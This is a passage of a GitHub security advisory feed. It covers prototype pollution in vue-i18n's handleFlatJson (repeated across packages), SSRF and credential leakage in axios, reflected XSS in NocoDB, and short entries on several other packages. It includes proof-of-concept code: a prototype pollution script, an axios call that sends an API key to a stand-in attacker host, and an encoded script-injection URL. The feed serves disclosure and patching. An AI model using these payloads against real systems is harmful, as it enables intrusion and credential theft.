<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[petite-vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/vue-i18n-core] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/message-resolver] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL]]></title>
        <id>https://github.com/advisories/GHSA-jr5f-v2jv-69x6</id>
        <link href="https://github.com/advisories/GHSA-jr5f-v2jv-69x6"/>
        <updated>2025-03-07T19:16:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).
Reference: axios/axios#6463</p>
<p>A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠<code>baseURL</code> is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.</p>
<h3 id="details">Details</h3>
<p>Consider the following code snippet:</p>
<pre><code class="language-js">import axios from "axios";

const internalAPIClient = axios.create({
  baseURL: "http://example.test/api/v1/users/",
  headers: {
    "X-API-KEY": "1234567890",
  },
});

// const userId = "123";
const userId = "http://attacker.test/";

await internalAPIClient.get(userId); // SSRF
</code></pre>
<p>In this example, the request is sent to <code>http://attacker.test/</code> instead of the <code>baseURL</code>. As a result, the domain owner of <code>attacker.test</code> would receive the <code>X-API-KEY</code> included in the request headers.</p>
<p>It is recommended that:</p>
<ul>
<li>   When <code>baseURL</code> is set, passing an absolute URL such as <code>http://attacker.test/</code> to <code>get()</code> should not ignore <code>baseURL</code>.</li>
<li>   Before sending the HTTP request (after combining the <code>baseURL</code> with the user-provided parameter), axios should verify that the resulting URL still begins with the expected <code>baseURL</code>.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Follow the steps below to reproduce the issue:</p>
<ol>
<li>   Set up two simple HTTP servers:</li>
</ol>
<pre><code>mkdir /tmp/server1 /tmp/server2
echo "this is server1" &gt; /tmp/server1/index.html 
echo "this is server2" &gt; /tmp/server2/index.html
python -m http.server -d /tmp/server1 10001 &amp;
python -m http.server -d /tmp/server2 10002 &amp;
</code></pre>
<ol start="2">
<li>   Create a script (e.g., main.js):</li>
</ol>
<pre><code class="language-js">import axios from "axios";
const client = axios.create({ baseURL: "http://localhost:10001/" });
const response = await client.get("http://localhost:10002/");
console.log(response.data);
</code></pre>
<ol start="3">
<li>   Run the script:</li>
</ol>
<pre><code>$ node main.js
this is server2
</code></pre>
<p>Even though <code>baseURL</code> is set to <code>http://localhost:10001/</code>, axios sends the request to <code>http://localhost:10002/</code>.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>   Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.</li>
<li>   SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.</li>
<li>   Affected Users: Software that uses <code>baseURL</code> and does not validate path parameters is affected by this issue.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6">https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6</a></li>
<li><a href="https://github.com/axios/axios/issues/6463">https://github.com/axios/axios/issues/6463</a></li>
<li><a href="https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f">https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f</a></li>
<li><a href="https://github.com/axios/axios/releases/tag/v1.8.2">https://github.com/axios/axios/releases/tag/v1.8.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27152">https://nvd.nist.gov/vuln/detail/CVE-2025-27152</a></li>
<li><a href="https://github.com/advisories/GHSA-jr5f-v2jv-69x6">https://github.com/advisories/GHSA-jr5f-v2jv-69x6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr5f-v2jv-69x6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:16:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB Vulnerable to Reflected Cross-Site Scripting on Reset Password Page]]></title>
        <id>https://github.com/advisories/GHSA-wf6c-hrhf-86cw</id>
        <link href="https://github.com/advisories/GHSA-wf6c-hrhf-86cw"/>
        <updated>2025-03-06T21:36:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The API endpoint related to the password reset function is vulnerable to Reflected Cross-Site-Scripting. </p>
<h3 id="details">Details</h3>
<p>Throughout the source-code analysis, it has been found that the endpoint /api/v1/db/auth/password/reset/:tokenId is vulnerable to Reflected Cross-Site-Scripting.</p>
<p>The flaw occurs due to implementation of the client-side template engine ejs, specifically on file resetPassword.ts where the template is using the insecure function “&lt;%-“ 
<a href="https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/ui/auth/resetPassword.ts#L71">https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/ui/auth/resetPassword.ts#L71</a><br>which is rendered by the function renderPasswordReset: 
<a href="https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/auth.controller.ts#L251">https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/auth.controller.ts#L251</a></p>
<h3 id="poc">PoC</h3>
<p>Send the request below to a vulnerable instance: 
<code>/api/v1/db/auth/password/reset/asdsad%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E/</code></p>
<p><img alt="image" src="https://github.com/user-attachments/assets/28d8e7c6-efb9-49df-b049-56dab229d74f"></p>
<h3 id="impact">Impact</h3>
<p>The vulnerability affect end-users, allowing an attacker to craft and send a malicious link to the victim which leads running script on their browser.</p>
<h3 id="credits">Credits</h3>
<p><a href="https://github.com/xL34K3D">l34k3d</a>
<a href="https://github.com/gabrielott">ottoboni</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-wf6c-hrhf-86cw">https://github.com/nocodb/nocodb/security/advisories/GHSA-wf6c-hrhf-86cw</a></li>
<li><a href="https://github.com/nocodb/nocodb/commit/ea821edb133e621e26183ae65c8ff9ee5d6f2723">https://github.com/nocodb/nocodb/commit/ea821edb133e621e26183ae65c8ff9ee5d6f2723</a></li>
<li><a href="https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/auth.controller.ts#L251">https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/auth.controller.ts#L251</a></li>
<li><a href="https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/ui/auth/resetPassword.ts#L71">https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/ui/auth/resetPassword.ts#L71</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27506">https://nvd.nist.gov/vuln/detail/CVE-2025-27506</a></li>
<li><a href="https://github.com/advisories/GHSA-wf6c-hrhf-86cw">https://github.com/advisories/GHSA-wf6c-hrhf-86cw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf6c-hrhf-86cw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T18:52:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.webjars.npm:json-pointer] Prototype Pollution in node-jsonpointer]]></title>
        <id>https://github.com/advisories/GHSA-282f-qqgm-c34q</id>
        <link href="https://github.com/advisories/GHSA-282f-qqgm-c34q"/>
        <updated>2025-03-05T19:06:11.000Z</updated>
        <content type="html"><![CDATA[<p>This affects the package <code>jsonpointer</code> before <code>5.0.0</code>. A type confusion vulnerability can lead to a bypass of a previous Prototype Pollution fix when the pointer components are arrays.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23807">https://nvd.nist.gov/vuln/detail/CVE-2021-23807</a></li>
<li><a href="https://github.com/janl/node-jsonpointer/pull/51">https://github.com/janl/node-jsonpointer/pull/51</a></li>
<li><a href="https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4">https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288">https://snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1910273">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1910273</a></li>
<li><a href="https://github.com/advisories/GHSA-282f-qqgm-c34q">https://github.com/advisories/GHSA-282f-qqgm-c34q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-282f-qqgm-c34q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-11-08T17:44:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI Flowise arbitrary file upload vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-69jq-qr7w-j7qh</id>
        <link href="https://github.com/advisories/GHSA-69jq-qr7w-j7qh"/>
        <updated>2025-03-05T18:37:35.000Z</updated>
        <content type="html"><![CDATA[<p>FlowiseAI Flowise v2.2.6 was discovered to contain an arbitrary file upload vulnerability in /api/v1/attachments.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26319">https://nvd.nist.gov/vuln/detail/CVE-2025-26319</a></li>
<li><a href="https://github.com/dorattias/CVE-2025-26319">https://github.com/dorattias/CVE-2025-26319</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/blob/flowise-ui%402.2.6/packages/server/src/index.ts#L165-L190">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%402.2.6/packages/server/src/index.ts#L165-L190</a></li>
<li><a href="https://github.com/advisories/GHSA-69jq-qr7w-j7qh">https://github.com/advisories/GHSA-69jq-qr7w-j7qh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69jq-qr7w-j7qh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-05T00:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[manifest] Manifest Uses a One-Way Hash without a Salt]]></title>
        <id>https://github.com/advisories/GHSA-h8h6-7752-g28c</id>
        <link href="https://github.com/advisories/GHSA-h8h6-7752-g28c"/>
        <updated>2025-03-04T22:23:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Manifest employs a weak password hashing implementation that uses SHA3 without a salt. This exposes user passwords to a higher risk of being cracked if an attacker gains access to the database. Without the use of a salt, identical passwords across multiple users will result in the same hash, making it easier for attackers to identify and exploit patterns, thereby accelerating the cracking process.</p>
<h3 id="details">Details</h3>
<p>Analysis of the application source code reveals that user passwords are hashed using the SHA3 algorithm without implementing a unique salt per user.</p>
<pre><code>const newUser: AuthenticableEntity = entityRepository.create(signupUserDto)
newUser.password = SHA3(newUser.password).toString()
</code></pre>
<p>This approach results in deterministic password hashes, which can be identified by comparing the hashes for users with matching credentials.</p>
<p><img alt="password without salt" src="https://github.com/user-attachments/assets/8ce816ab-0351-44d4-9aa3-717266441d6e"></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create two users with the same password (it could be admin or any other authenticatable entity)</li>
<li>Extract their password hashes from the database</li>
<li>Verify that both hashes are identical, confirming the absence of unique salts</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is a cryptographic weakness vulnerability that affects all users of the system. The lack of a unique salt when hashing passwords reduces protection against database breaches, as attackers who gain access to the database can more efficiently crack user passwords. Since identical passwords result in identical hashes, attackers can use precomputed hash databases (e.g., Rainbow Tables) or offline brute-force attacks to reverse the hashes and obtain user passwords, increasing the risk of compromised accounts and further system exploitation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mnfst/manifest/security/advisories/GHSA-h8h6-7752-g28c">https://github.com/mnfst/manifest/security/advisories/GHSA-h8h6-7752-g28c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27408">https://nvd.nist.gov/vuln/detail/CVE-2025-27408</a></li>
<li><a href="https://github.com/mnfst/manifest/commit/3ed6f1324e96ad469ad929d470dcd0cc386c6c69">https://github.com/mnfst/manifest/commit/3ed6f1324e96ad469ad929d470dcd0cc386c6c69</a></li>
<li><a href="https://github.com/advisories/GHSA-h8h6-7752-g28c">https://github.com/advisories/GHSA-h8h6-7752-g28c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h8h6-7752-g28c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T19:55:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tsup] tsup DOM Clobbering vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-3mv9-4h5g-vhg3</id>
        <link href="https://github.com/advisories/GHSA-3mv9-4h5g-vhg3"/>
        <updated>2025-03-03T22:22:45.000Z</updated>
        <content type="html"><![CDATA[<p>A DOM Clobbering vulnerability in tsup v8.3.4 allows attackers to execute arbitrary code via a crafted script in the import.meta.url to document.currentScript in cjs_shims.js components</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53384">https://nvd.nist.gov/vuln/detail/CVE-2024-53384</a></li>
<li><a href="https://gist.github.com/jackfromeast/36f98bf7542d11835c883c1d175d9b92">https://gist.github.com/jackfromeast/36f98bf7542d11835c883c1d175d9b92</a></li>
<li><a href="https://github.com/advisories/GHSA-3mv9-4h5g-vhg3">https://github.com/advisories/GHSA-3mv9-4h5g-vhg3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3mv9-4h5g-vhg3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-03T18:31:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[seajs] seajs Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pfr4-4397-3hg8</id>
        <link href="https://github.com/advisories/GHSA-pfr4-4397-3hg8"/>
        <updated>2025-03-03T22:20:22.000Z</updated>
